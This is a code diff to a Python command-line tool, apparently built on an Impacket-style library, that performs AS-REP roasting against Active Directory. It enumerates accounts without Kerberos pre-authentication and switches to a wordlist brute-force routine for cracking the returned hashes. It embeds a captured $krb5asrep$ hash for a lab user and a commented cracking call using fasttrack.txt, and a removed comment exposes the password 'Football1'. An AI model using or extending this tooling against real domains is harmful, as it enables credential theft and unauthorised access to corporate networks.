@@ -2,7 +2,7 @@ import cmd
 import argparse
 import re
 from pympacket.attacks.GetNPUsers import GetUserNoPreAuth
-from pympacket.utils.bruteforce import build_krb5asrep_hash, Target
+from pympacket.utils.bruteforce import bruteforce_asrep, Target
 
 def ipv4_address(value):
     # Regular expression to match an IPv4 address (four octets)
@@ -27,26 +27,25 @@ class ImpacketCLI(cmd.Cmd):
         group.add_argument('-u', '--username', type=str, required=False, help='The username to test.')
         group.add_argument('-p', '--password', type=str, required=False, help='The password to test.')
         group.add_argument('-w', '--wordlist', type=str, required=False, help='The wordlist containing the users to test.')
-        parser.add_argument_group()
+        group.add_argument('-v', '--verbose', type=bool, required=False, help='Whether to print the process or not.')
 
         try:
             args = parser.parse_args(args.split())
             if not (args.username and args.password) and not args.wordlist:
                 parser.error("Username and password or a wordlist are required.")
-            print(f"Domain Controller IP: {args.dc_ip}")
         except SystemExit:
             print("Invalid arguments. Use 'help get_users' for usage details.")
             parser.print_help()
 
-        cmdLineOptions = {"no_pass": True if args.wordlist else False, "usersfile": args.wordlist, "k": False}
+        cmdLineOptions = {"no_pass": True if args.wordlist else False, "usersfile": args.wordlist, "k": False, 'verbose': args.verbose}
 
         npu = GetUserNoPreAuth(username=args.username, password=args.password, domain=args.domain, cmdLineOptions=cmdLineOptions)
 
-        # test = Target(username='l.douglas', domain='contoso.local', hash='$krb5asrep$23$l.douglas@CONTOSO.LOCAL:9f13fafda4096f35b829f6a9f5045d29$d4bf323934e5b21d21c83bfcdc294fcc26af6d03c372a4a5b45b32d05e3d6e1fe3a90bccbcf8683b14a1c74d50a3c9e1c9ecca2c4aacdb254ed009ebd1770502c66ed54d9a40604639269d60e9c0c12fff1e1c9f03198578dfccd1736d93cf940408a4636402a13e2e1d9d25f50421b6f309bfa7b1b327b3e91ac7fe3414a76437dc12f0d2100dc407a8af2a14e23aae24b12948c7c814489118671f875835eab7934a7cd3199ca00f8f8847780b9f569fe0500ebdf30ce1cee97bb52cf9807df64ea67caf5357eddb38f4bb6c9c4f8245382c3abc890cd5b845faf0d0eab8ee0ab3f1c40994766b8e01b09dc2d5')
+        target_user = Target(username='l.douglas', domain='contoso.local', hash='$krb5asrep$23$l.douglas@CONTOSO.LOCAL:3b2b825dcf3910791f9e6c6c6452978b$e74721709d2f4d2b29574c066791fca58cd026aacc20fadf6158d160a4a82d637fe8dd344d02dede890ea21442e61c321dce943ed7b58e1c2f41ebacbe5d0295958eadf4607d4e2527428f2b26f48d6457f2c451fc59ad3b365921699b6449f9aa985cc6e1c2c89cc720915892136c9a8851310077d44c3783f393671dc8fda1b5c05c9b1acfb8211f8d42545c5d32d6269ffe8f5c139ae24cf71207c5184f860ca0487181f5d124d7fa5d5ecf81f38eb24783249d46e137aa5acef6a45ebd63d8ecfdd8b0173a46fff5d0382ccab4456b32a7d8c6e3dfc505f529162c8f8b63494ab6a54e5e5a203f36a3621bbb')
 
-        # print(build_krb5asrep_hash(password='Football1', target=test))
+        # print(bruteforce_asrep(wordlist='fasttrack.txt', hash=target_user.hash))
 
-        npu.run()
+        print(npu.run())
 
     def do_quit(self, line):
         """Exit the CLI."""
